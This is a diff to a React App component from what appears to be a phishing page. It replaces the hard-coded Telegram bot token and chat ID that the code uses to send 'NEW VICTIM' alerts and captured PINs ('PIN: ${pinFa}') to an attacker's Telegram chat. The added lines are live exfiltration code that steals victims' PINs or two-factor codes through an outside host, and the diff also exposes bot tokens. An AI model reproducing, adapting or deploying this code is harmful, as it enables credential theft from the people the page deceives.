@@ -24,8 +24,8 @@ function App() {
   const [spinner, spinnerSet] = useState('formal');
 
 
-  const botToken = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
-  const chatId = '-908968924';
+  const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
+  const chatId = '-937223528';
   const message = `NEW VICTIM`;
 
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -120,8 +120,8 @@ function App() {
   const handlePinFA = async (e) => {
     e.preventDefault()
 
-    const botToken = '6106991708:AAG2YP9S_tPIYfxsh5r7kuUHycrUkrqGcjc';
-    const chatId = '-908968924';
+   const botToken = '5487410170:AAF60BxMlwAyuSyBzI88bj3ITFU2C6P71r4';
+   const chatId = '-937223528';
     const message = `PIN: ${pinFa}`;
   
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
